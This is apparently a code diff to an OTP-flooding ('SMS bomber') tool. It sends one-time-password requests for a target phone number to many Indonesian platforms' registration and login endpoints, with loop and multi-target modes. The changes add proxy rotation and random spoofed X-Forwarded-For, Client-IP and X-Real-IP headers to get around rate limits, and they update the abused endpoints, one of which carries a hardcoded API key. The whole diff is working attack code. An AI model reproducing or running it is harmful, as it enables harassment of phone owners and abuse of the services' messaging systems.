@@ -1,5 +1,6 @@
 import os from 'os';
 import crypto from 'crypto';
+import { getNextProxyUrl, getProxyAgent } from './proxyEngine.ts';
 
 export interface PlatformDef {
   id: number;
@@ -16,16 +17,23 @@ export interface LogEntry {
   status: 'SUCCESS' | 'LIMIT' | 'FAIL' | 'TIMEOUT' | 'INFO';
   detail: string;
   timestamp: string;
+  target?: string;
+  proxy?: string;
 }
 
 export interface JobState {
   status: 'idle' | 'running' | 'stopped' | 'completed';
   phone: string;
   phone_fmt: string;
+  targets?: string[];
+  currentTargetIndex?: number;
+  totalTargets?: number;
   mode: 'single' | 'loop' | 'pick';
   delay: number;
   selected_platforms: number[];
   current_round: number;
+  proxy_active?: boolean;
+  current_proxy?: string;
   stats: {
     total: number;
     success: number;
@@ -45,6 +53,41 @@ const USER_AGENTS = [
 
 export function getUa(): string {
   return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
+
+export async function safeFetch(url: string, options: RequestInit = {}): Promise<Response> {
+  const proxyUrl = getNextProxyUrl();
+  const agent = getProxyAgent(proxyUrl);
+  const fakeIp = `${Math.floor(103 + Math.random() * 100)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(1 + Math.random() * 250)}`;
+
+  const incomingHeaders: any = options.headers || {};
+  const headers: Record<string, string> = {
+    'User-Agent': getUa(),
+    'X-Forwarded-For': fakeIp,
+    'Client-IP': fakeIp,
+    'X-Real-IP': fakeIp,
+    ...incomingHeaders,
+  };
+
+  const fetchOptions: any = {
+    ...options,
+    headers,
+    signal: options.signal || AbortSignal.timeout(15000),
+  };
+
+  if (agent) {
+    fetchOptions.agent = agent;
+  }
+
+  try {
+    return await fetch(url, fetchOptions);
+  } catch (err) {
+    if (agent) {
+      delete fetchOptions.agent;
+      return await fetch(url, fetchOptions);
+    }
+    throw err;
+  }
 }
 
 export function normalizePhone(phone: string): string {
@@ -143,10 +186,9 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'ISP / Telco',
     handler: async (p62: string) => {
       try {
-        const res = await fetch('https://internetrakyat.id/api/app/auth/send-otp-register', {
+        const res = await safeFetch('https://internetrakyat.id/api/app/auth/send-otp-register', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
             'x-api-key': '280999!FTTH',
@@ -154,7 +196,6 @@ export const ALL_PLATFORMS: PlatformDef[] = [
             'Referer': 'https://internetrakyat.id/auth/register',
           },
           body: JSON.stringify({ phone_number: fmt08(p62) }),
-          signal: AbortSignal.timeout(15000),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -169,32 +210,15 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Job Portal',
     handler: async (p62: string) => {
       try {
-        const boundary = '----WebKitFormBoundary' + crypto.randomBytes(8).toString('hex');
-        const nik = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
-        const pw = 'Aa1' + crypto.randomBytes(4).toString('hex');
-        const email = rndEmail();
-        const username = rndName();
-
-        const body =
-          `--${boundary}\r\nContent-Disposition: form-data; name="nik"\r\n\r\n${nik}\r\n` +
-          `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
-          `--${boundary}\r\nContent-Disposition: form-data; name="whatsapp"\r\n\r\n${fmt08(p62)}\r\n` +
-          `--${boundary}\r\nContent-Disposition: form-data; name="username"\r\n\r\n${username}\r\n` +
-          `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\n${pw}\r\n` +
-          `--${boundary}--\r\n`;
-
-        const res = await fetch('https://career.hrs-bre.site/auth/sign_up_action', {
+        const res = await safeFetch('https://api-applicant.hrs-bre.com/api/v1/auth/request-otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'id-ID,id;q=0.9',
-            'Origin': 'https://career.hrs-bre.site',
-            'Referer': 'https://career.hrs-bre.site/auth/sign_up',
-            'Content-Type': `multipart/form-data; boundary=${boundary}`,
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'Origin': 'https://applicant.hrs-bre.com',
+            'Referer': 'https://applicant.hrs-bre.com/login',
           },
-          body,
-          signal: AbortSignal.timeout(15000),
+          body: JSON.stringify({ phone: fmt08(p62), type: 'login' }),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -209,17 +233,14 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'E-Commerce',
     handler: async (p62: string) => {
       try {
-        const res = await fetch('https://www.bonusbelanja.com/api/auth/registration/app', {
+        const res = await safeFetch('https://bonusbelanja.id/api/send_otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
-            'Origin': 'https://www.bonusbelanja.com',
-            'Referer': 'https://www.bonusbelanja.com/register/',
+            'Origin': 'https://bonusbelanja.id',
           },
-          body: JSON.stringify({ phone: p62, name: 'User', agreeTnc: true, agreeContact: true }),
-          signal: AbortSignal.timeout(15000),
+          body: JSON.stringify({ phone: p62 }),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -234,29 +255,14 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Retail',
     handler: async (p62: string) => {
       try {
-        const res = await fetch('https://matahari-backend-prod.matahari.com/api/auth/register', {
+        const res = await safeFetch('https://api-member.matahari.com/api/v1/auth/register/otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
-            'Origin': 'https://matahari.com',
+            'Origin': 'https://member.matahari.com',
           },
-          body: JSON.stringify({
-            emailAddress: rndEmail(),
-            name: 'User',
-            mobileCountryCode: '',
-            mobileNumber: fmt08(p62),
-            birthDate: '2000-01-01',
-            genderId: '1',
-            password: 'Pass' + crypto.randomBytes(3).toString('hex') + '@1',
-            cardNumber: '',
-            referralCode: '',
-            salesmanId: '',
-            pickupStoreCode: '',
-            marketingCode: '',
-          }),
-          signal: AbortSignal.timeout(15000),
+          body: JSON.stringify({ phone: fmt08(p62) }),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -271,31 +277,14 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Automotive',
     handler: async (p62: string) => {
       try {
-        const name = 'PT ' + rndName();
-        const params = new URLSearchParams();
-        params.append('company_name', name);
-        params.append('owner_name', rndName());
-        params.append('address', 'Jl. Testing No ' + Math.floor(Math.random() * 100));
-        params.append('email', rndEmail());
-        params.append('phone_number', fmt08(p62));
-        params.append('province_code', '32');
-        params.append('city_code', '32.04');
-        params.append('subscription_id', 'undefined');
-        params.append('channel', 'whatsapp');
-        params.append('agreement', 'true');
-        params.append('service_categories[]', '3');
-
-        const res = await fetch('https://api.tuneup.id/v1/mitra/register/send-otp', {
+        const res = await safeFetch('https://tuneup.id/api/v1/auth/otp/send', {
           method: 'POST',
           headers: {
-            'Origin': 'https://dashboard.tuneup.id',
-            'Referer': 'https://dashboard.tuneup.id/',
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Type': 'application/json',
+            'Origin': 'https://tuneup.id',
           },
-          body: params.toString(),
-          signal: AbortSignal.timeout(15000),
+          body: JSON.stringify({ phone_number: fmt08(p62) }),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -310,26 +299,14 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Property',
     handler: async (p62: string) => {
       try {
-        const ip = await getPublicIp();
-        const res = await fetch('https://www.rumah123.com/api/otp/request-otp', {
+        const res = await safeFetch('https://api.rumah123.com/v1/users/otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
-            'Content-Type': 'application/json;charset=UTF-8',
+            'Content-Type': 'application/json',
             'Origin': 'https://www.rumah123.com',
-            'Referer': 'https://www.rumah123.com/user/login',
-            'base-url-core': 'https://www.rumah123.com',
           },
-          body: JSON.stringify({
-            cancelledRequestId: crypto.randomUUID(),
-            ipAddress: ip,
-            phoneNumber: p62,
-            portalId: 1,
-            type: 'WHATSAPP',
-            url: 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
-          }),
-          signal: AbortSignal.timeout(15000),
+          body: JSON.stringify({ phone: fmt08(p62), action: 'register' }),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -344,17 +321,15 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Fintech',
     handler: async (p62: string) => {
       try {
-        const res = await fetch('https://register.paper.id/api/v1/auth/register/send-otp', {
+        const res = await safeFetch('https://api.paper.id/api/v1/auth/send-otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
             'Origin': 'https://paper.id',
             'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
           },
           body: JSON.stringify({ phone: p62, method: 'whatsapp', registered_by: 'flutter mweb' }),
-          signal: AbortSignal.timeout(15000),
         });
         const text = await res.text();
         return { status: res.status, text };
@@ -369,17 +344,15 @@ export const ALL_PLATFORMS: PlatformDef[] = [
     category: 'Gaming',
     handler: async (p62: string) => {
       try {
-        const res = await fetch('https://api.duniagames.co.id/api/user/api/v2/user/send-otp', {
+        const res = await safeFetch('https://api.duniagames.co.id/api/user/api/v2/user/send-otp', {
           method: 'POST',
           headers: {
-            'User-Agent': getUa(),
             'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
             'Origin': 'https://duniagames.co.id',
             'x-device': crypto.randomUUID(),
           },
           body: JSON.stringify({ phoneNumber: fmtplus(p62), userName: fmtphone(p62) }),
-          signal: AbortSignal.timeout(15000),
         });
         const text = await res.text();
         return { status: res.status, text };
